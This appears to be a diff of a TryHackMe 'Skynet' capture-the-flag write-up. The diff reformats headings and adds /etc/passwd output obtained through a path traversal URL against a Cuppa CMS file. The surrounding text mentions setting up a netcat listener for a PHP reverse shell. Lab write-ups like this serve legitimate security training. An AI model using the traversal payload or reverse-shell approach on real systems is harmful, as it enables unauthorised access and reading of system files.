@@ -1,8 +1,8 @@
 # THM - Skynet
 
-##### Ip: 10.10.233.29
-##### Name: Skynet
-##### Rating: Easy
+#### Ip: 10.10.233.29
+#### Name: Skynet
+#### Rating: Easy
 
 ------------------------------------------------
 
@@ -204,6 +204,15 @@ Kicking off some directory scanning we find: http://10.10.90.184/45kra24zxs28v3y
 Looking for cuppa exploits I find: https://www.exploit-db.com/exploits/25971
 
 We can confirm the vulnerability exists by viewing the `/etc/passwd` file at: http://10.10.90.184/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+```
+<SNIP>
+milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
+dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
+dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
+postfix:x:113:121::/var/spool/postfix:/bin/false
+mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
+```
 
 Cool, let's now locate a copy of PentestMonkey's php-reverse-shell.php, set up a nc listener and an http server and download our script:
 
